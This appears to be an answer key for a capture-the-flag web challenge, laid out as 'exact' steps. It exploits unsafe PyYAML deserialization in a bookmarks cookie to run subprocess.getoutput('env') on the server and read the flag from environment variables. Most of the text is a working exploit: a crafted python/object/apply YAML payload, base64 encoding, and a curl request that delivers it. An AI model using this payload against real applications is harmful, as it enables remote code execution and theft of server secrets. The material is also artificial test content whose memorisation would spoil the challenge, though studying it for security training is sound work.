# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Insecure deserialization → RCE via unsafe `yaml.load(...,
Loader=yaml.Loader)` on an attacker-controlled `bookmarks` cookie. The flag is in
the environment. Craft a YAML object whose `name` attribute is the output of
`subprocess.getoutput("env")`.

1. **Build the malicious YAML and base64-encode it:**

   ```
   PAYLOAD=$(python3 -c '
   import base64
   p = """- !!python/object:app.models.UrlObj
     name: !!python/object/apply:subprocess.getoutput ["env"]
     url: http://example.com
   """
   print(base64.b64encode(p.encode()).decode())')
   ```

2. **Send it as the `bookmarks` cookie** (a `user` cookie is also required) to
   `/list`, which calls `yaml.load()` on it:

   ```
   curl -s "http://<target>/list" -H "Cookie: bookmarks=$PAYLOAD; user=attacker"
   ```

3. **Extract the flag** (`FLAG{...}`) from the `FLAG=` line in the rendered `env`
   output and report it verbatim.
